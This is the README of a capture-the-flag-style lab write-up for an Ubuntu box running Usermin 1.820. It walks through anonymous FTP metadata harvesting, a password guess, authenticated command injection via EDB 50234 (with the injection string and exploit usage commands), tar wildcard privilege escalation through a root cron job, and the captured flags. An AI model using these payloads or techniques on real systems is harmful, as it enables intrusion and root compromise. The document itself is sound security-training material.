# 192.168.161.157 — `charlie` (Ubuntu 22.04.1, Usermin 1.820)

| | |
|---|---|
| **Hostname** | `lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111` |
| **OS** | Ubuntu 22.04.1 LTS (jammy), kernel `5.15.0-52-generic` |
| **Open ports** | `21` vsftpd 3.0.5 (anonymous) · `22` OpenSSH 8.9p1 · `80` Apache 2.4.52 (default page) · `20000` MiniServ/1.820 = **Usermin** |
| **Difficulty** | Easy — no exploit development, but two traps: the wrong product name, and an account that is deliberately denied SSH |
| **Result** | root, `local.txt` and `proof.txt` |
| **Flags** | `9c3006bdea469fa32aace984f50acc19` (user) · `06fc3530c91d86d66a81d84a116f4eb0` (root) |

---

## TL;DR — the chain

```text
21/tcp vsftpd, anonymous allowed
  └─ /backup  →  five Microsoft Word templates
     exiftool dc:creator  →  Robert · Mark · Cassie
        │  the password is the username with the case flipped
        ▼
cassie : cassie                      (3 users × 3 case variants = 9 tries)
  ├─ FTP read  →  /home/cassie/local.txt
  └─ Usermin   →  https://192.168.161.157:20000
        ▼
Usermin 1.820  →  GnuPG module  →  key name in `--fingerprint "…"`
  '";<command>echo "'                (EDB 50234, one line to fix)
     └─ RCE as cassie, no shell needed: write files, read them over FTP
        ▼
/etc/ssh/sshd_config : "DenyUsers cassie"      ← why SSH never worked
        ▼
/etc/cron.d/2minutes : */2 * * * * root cd /opt/admin && tar -zxf … *
  /opt/admin is owned by cassie
     --checkpoint=1  --checkpoint-action=exec=sh pwn.sh
        └─ tar runs our script as root every two minutes
           ▼
/home/cassie/rootbash -p -i   →  proof.txt
```

## Two things this box teaches

1. **The banner is a hint, not a fact.** `MiniServ/1.820` on port 20000 is **Usermin**, not Webmin.
   Webmin's default is 10000. Reading "Webmin" sends you to CVE-2019-15107 (1.890–1.920) and a dead
   end; reading "Usermin" sends you to EDB 50234, which is the actual bug on the box.

2. **"SSH is open" does not mean "SSH accepts you".** `DenyUsers cassie` sits in `sshd_config`, and
   it is evaluated *before* authentication. A correct password and a correct `authorized_keys` both
   fail with the same `Permission denied`, which looks exactly like a credential problem. The answer
   is one grep away — in `/var/log/auth.log`, which the account can read because it is in `adm`.

## Why the published exploit did not work as shipped

EDB 50234 crashes with `IndexError: list index out of range` at:

```python
last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
```

`[-2]` requires at least two `edit_key.cgi` links in the key list. On a keyring that renders fewer
than two, `re.findall` returns a short list and the index throws — before any command runs. The
exploit also treats the word `successfully` on the response page as proof that key creation worked,
and that word appears in the page boilerplate **even when gpg refused to create the key**.

The fixed script in `scripts/` checks the keyring before and after, prints the real gpg error, and
falls back to importing a key whose UID carries the payload. On this box the creation path works, so
the fallback was never needed — but the index bug was.

## Chapters

| # | File | What it covers |
|---|---|---|
| 01 | [01-reconnaissance.md](01-reconnaissance.md) | Four ports, the Apache default page, and Usermin vs Webmin |
| 02 | [02-anonymous-ftp-and-pdf-metadata.md](02-anonymous-ftp-and-pdf-metadata.md) | Anonymous `/backup`, `exiftool`, three authors, nine guesses |
| 03 | [03-usermin-and-gnupg.md](03-usermin-and-gnupg.md) | Panel access as `cassie`, the GnuPG module, EDB 50234's sink |
| 04 | [04-foothold.md](04-foothold.md) | Running the fixed exploit, proving code execution without a shell |
| 05 | [05-ssh-denied.md](05-ssh-denied.md) | A 91-byte key that could never work, and `DenyUsers` |
| 06 | [06-privilege-escalation.md](06-privilege-escalation.md) | `tar` wildcard injection through a cron job in an attacker-owned directory |
| 07 | [07-flags-and-cleanup.md](07-flags-and-cleanup.md) | Flags, the debris this chain leaves, cleanup, remediation, lessons |
| A | [08-appendix-scripts.md](08-appendix-scripts.md) | Every script in full, plus the inline payloads and their quoting |

## Artifacts

| Path | What |
|---|---|
| [`scripts/exploit_usermin_1820_7f3a.py`](scripts/exploit_usermin_1820_7f3a.py) | the exploit actually used — verify-then-trigger, import fallback, `--payload` |
| [`scripts/edb-50234-patched.py`](scripts/edb-50234-patched.py) | the minimal in-place patch of the published exploit: two edits, same output |
| [`scripts/charlie_ftp_credtest_7f3a.py`](scripts/charlie_ftp_credtest_7f3a.py) | 9-attempt FTP tester that finds `cassie:cassie` and pulls `local.txt` |
| [`scripts/enum_spray_2.sh`](scripts/enum_spray_2.sh) | standalone scanner + sprayer; every service ends `HIT`/`CLEAN`/`PARTIAL`/`INCONCLUSIVE` |
| [`scripts/gencreds_charlie_7f3a.sh`](scripts/gencreds_charlie_7f3a.sh) | name → username/password mutation list |
| [`scripts/privesc_tar_wildcard_7f3a.sh`](scripts/privesc_tar_wildcard_7f3a.sh) | plants the `--checkpoint` payload in `/opt/admin` and waits for the tick |
| [`scripts/unblock_sshd_7f3a.sh`](scripts/unblock_sshd_7f3a.sh) | removes `DenyUsers`, validates with `sshd -t`, restarts ssh |
| [`evidence/evidence_recon.txt`](evidence/evidence_recon.txt) | nmap and the HTTP fingerprints, verbatim |
| [`evidence/evidence_ftp.txt`](evidence/evidence_ftp.txt) | anonymous login, `/backup` listing, `exiftool` output |
| [`evidence/evidence_foothold.txt`](evidence/evidence_foothold.txt) | exploit runs, the `IndexError`, the `id` read back over FTP |
| [`evidence/evidence_privesc.txt`](evidence/evidence_privesc.txt) | the cron file, `/opt/admin`, the tar run, root |

## Usage

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install requests

python3 scripts/charlie_ftp_credtest_7f3a.py -H 192.168.161.157
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1337 \
  --payload 'id > /home/cassie/exec_test.txt 2>&1;'
```

> **The payload needs a trailing `;`.** It is spliced into `";<payload>echo "`. Without the separator
> `/bin/sh` sees `2>&1echo` and dies with `Bad fd number` before running anything.

> **Cleanup matters.** The `tar` wildcard files live in `/opt/admin` and re-execute every two
> minutes until they are removed. See chapter 07.

## Attribution

EDB 50234 — *Usermin 1.820 — Remote Code Execution (Authenticated)*, reworked by Numan Turle /
Tunahan TEKEOĞLU. This writeup uses a repair of that script, not a new exploit.

Written against a machine in an authorised training range.
